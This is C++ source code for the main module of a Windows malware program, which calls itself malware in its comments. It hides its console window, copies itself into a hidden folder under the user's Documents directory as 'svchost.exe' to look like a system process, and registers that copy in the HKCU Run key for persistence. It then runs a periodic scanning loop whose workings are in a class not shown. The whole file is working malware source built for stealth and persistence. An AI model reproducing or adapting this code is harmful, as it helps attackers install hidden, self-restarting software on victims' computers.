#include "Round.h"

const int TIME_PER_SCANS = 60;
const int CURR_FILE_PATH_MAX_LEN = 2048;
const int TIME_TO_WAIT = 10;
const string MALWARE_FILE_NAME = "svchost.exe";

void activateNewMalwareFile();
string findHostUsername();
bool checkIfMalwareFile();
void addToRegistryRun(string filePath, string value);
bool checkExistenceInRegistry(string value);

int main(void)
{
	//remove console window
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
	
	
	if (!checkIfMalwareFile())
	{
		try {
			activateNewMalwareFile();
		}
		catch (exception e) {
			//std::cout << "couldn't create malware!";
			return 1;
		}
	}
	else
	{
		//in auto run, wait until the computer wakes up, get an ip address, etc...
		std::this_thread::sleep_for(std::chrono::seconds(TIME_TO_WAIT));

		string folderPath = PATH[0] + findHostUsername() + PATH[1] + "\\" + FOLDER_NAME;
		
		//make sure that system commands starts from the write positions
		if (_chdir(folderPath.c_str()))
		{
			return 1;
		}

		int i = 0;
		string fileName = "file";
		while (true)
		{
			Round r(fileName); // +std::to_string(i));
			thread t(std::ref(r));

			//std::cout << "start sleep\n";
			std::this_thread::sleep_for(std::chrono::seconds(TIME_PER_SCANS));
			//std::cout << "finish sleep\n";
			//r.finish();
			t.join();
			i++;
		}
	}
	return 0;
}

/*
the function will run once, when the user launches the original malware file
input: none
output: none
*/
void activateNewMalwareFile()
{
	//create new hidden folder with unsuspicious name here-> C:\Users\<userName>\Documents
	string folderPath = PATH[0] + findHostUsername() + PATH[1] + "\\" + FOLDER_NAME;
	
	char currFilePath[CURR_FILE_PATH_MAX_LEN] = "\0";

	CreateDirectory(folderPath.c_str(), NULL);
	SetFileAttributes(folderPath.c_str(), FILE_ATTRIBUTE_HIDDEN); // hide the directory

	GetModuleFileName(NULL, currFilePath, CURR_FILE_PATH_MAX_LEN);

	//put a copy of this .exe file in the new folder (with unsuspicious name)
	CopyFile(currFilePath, (folderPath + "\\" + MALWARE_FILE_NAME).c_str(), false);
	
	addToRegistryRun(folderPath + "\\" + MALWARE_FILE_NAME, "svchost");
	
	//create process from the copy that was created and give it parameters	
	system((folderPath + "\\" + MALWARE_FILE_NAME).c_str());
}

/*
The function will find the name of the computer host
input: none
output: none
*/
string findHostUsername()
{
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);

	return username;

	//std::cout << this->_currentUserName;
}

/*
the function will check if the running process is the one that should activate the malware
input: none
output: none
*/
bool checkIfMalwareFile()
{
	char currFilePath[CURR_FILE_PATH_MAX_LEN] = "\0";

	GetModuleFileName(NULL, currFilePath, CURR_FILE_PATH_MAX_LEN);

	string path = currFilePath;

	return path.find(FOLDER_NAME) != std::string::npos;
}

/*
the function will add the value to the registry "run"
input: the file that we want to add to registry, the name that will be shown in the registry
output: none
*/
void addToRegistryRun(string filePath, string value)
{
	if (!checkExistenceInRegistry(value))
	{
		//set program to start automatically when user login to the computer
		string addToAutoRun = "REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + value + " /t REG_SZ /d " +
			filePath;

		//std::cout << addToAutoRun << std::endl;
		system((addToAutoRun + " > registry.txt").c_str());

		std::remove("registry.txt");
	}
}

/*
the function will check if the malware already appears in the registry
input: value name in the registry
output: true or false if the value appears in the registry
*/
bool checkExistenceInRegistry(string value)
{
	HKEY hKey;
	LONG nResult;
	bool bExist = false;
	if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
	{
		DWORD dwType;
		nResult = RegQueryValueEx(hKey, value.c_str(), NULL, &dwType, NULL, NULL);
		if (nResult == ERROR_SUCCESS)
			bExist = true;
		RegCloseKey(hKey);
	}
	
	//std::cout << bExist << std::endl;
	return bExist;
}